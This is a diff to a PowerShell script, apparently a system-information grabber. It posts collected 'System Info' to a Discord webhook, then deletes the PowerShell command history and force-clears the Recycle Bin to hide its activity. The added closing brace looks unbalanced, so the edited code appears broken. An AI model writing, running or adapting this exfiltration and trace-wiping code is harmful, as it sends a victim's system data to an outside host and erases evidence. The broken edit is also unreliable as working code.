@@ -82,12 +82,14 @@ function Send-ToDiscord {
     $payload = @{ content = "```$Message```" } | ConvertTo-Json
 
     try {
-        Invoke-RestMethod -Uri $DiscordWebhookUrl -Method Post -ContentType "application/json" -Body $payload
-        Write-Host "Data sent to Discord successfully."
+        Invoke-RestMethod -Uri $DiscordWebhookUrl -Method Post -ContentType 'application/json' -Body $payload
+Write-Host "Sending System Info directly to Discord."
+
     } catch {
         Write-Error "Failed to send data to Discord."
         Write-Error $_.Exception.Message
     }
+}
 }
 
 # Send the Full System Info to Discord
@@ -98,4 +100,6 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 # Signal Completion
-(New-Object -ComObject Wscript.Shell).Popup("Script execution complete", 1)
+$done = New-Object -ComObject Wscript.Shell
+$done.Popup("Script execution complete", 1)
+
